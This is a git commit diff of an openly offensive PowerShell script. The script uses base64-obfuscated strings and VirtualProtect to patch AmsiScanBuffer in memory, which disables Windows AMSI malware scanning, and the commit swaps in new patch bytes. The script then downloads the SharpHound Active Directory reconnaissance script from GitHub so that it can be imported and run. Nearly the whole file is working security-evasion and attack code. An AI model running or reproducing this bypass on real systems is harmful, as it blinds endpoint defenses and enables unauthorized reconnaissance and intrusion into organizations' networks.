62686530583bda5908e1a45f1c76cbc261e94f4e
logboring <131881058+logboring@users.noreply.github.com>
2023-04-26 09:14:59 -0500

    Update and rename amsi_bloodhound.ps1 to amsi_bloodhound_new.ps1

--- amsi_bloodhound_new.ps1
+++ amsi_bloodhound_new.ps1
@@ -1,4 +1,5 @@
 $exec_dll = "`"kernel32.dll`""
+$line0 = "@`""
 $line1 = "using System;"
 $line2 = "using System.Runtime.InteropServices;"
 $line3 = "public class Win32 {"
@@ -9,8 +10,9 @@ $line7 = "public static extern IntPtr LoadLibrary(string name);"
 $line8 = "[DllImport($exec_dll)]"
 $line9 = "public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);"
 $line10 = "}"
+$line11 = "`"@"
 
-$exec_line = $line1 + "`n" + $line2 + "`n" + $line3 + "`n" + $line4 + "`n" + $line5 + "`n" + $line6 + "`n" + $line7 + "`n" + $line8 + "`n" + $line9 + "`n" + $line10
+$exec_line = $line0 + "`n" + $line1 + "`n" + $line2 + "`n" + $line3 + "`n" + $line4 + "`n" + $line5 + "`n" + $line6 + "`n" + $line7 + "`n" + $line8 + "`n" + $line9 + "`n" + $line10 + "`n" + $line11
 $Bytes = [System.Text.Encoding]::Unicode.GetBytes($exec_line)
 $EncodedText =[Convert]::ToBase64String($Bytes)
 ${kasdnfasdf} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($EncodedText)))
@@ -19,8 +21,8 @@ ${lkmjymlt} = [Win32]::LoadLibrary("am" + $([Text.Encoding]::Unicode.GetString([
 ${oiwuaefnhoiewm} = [Win32]::GetProcAddress(${lkmjymlt}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQA='))) + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGEAbgA='))) + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB1AGYAZgBlAHIA'))))
 ${lkaknfmklad} = 0
 [Win32]::VirtualProtect(${oiwuaefnhoiewm}, [uint32]5, 0x40, [ref]${lkaknfmklad})
-${olmsdfvnodifngon} = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
-[System.Runtime.InteropServices.Marshal]::Copy(${olmsdfvnodifngon}, 0, ${oiwuaefnhoiewm}, 6)
+${olmsdfvnodifngon} = [Byte[]] (0x66, 0xB8, 0x01, 0x00, 0xC2, 0x18, 0x00)
+[System.Runtime.InteropServices.Marshal]::Copy(${olmsdfvnodifngon}, 0, ${oiwuaefnhoiewm}, 7)
 
 Invoke-WebRequest "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1" -OutFile "c:\test\SharpHound.ps1"
 write-host "Import and Execution of SharpHound.ps1 from c:\test" -ForegroundColor Cyan
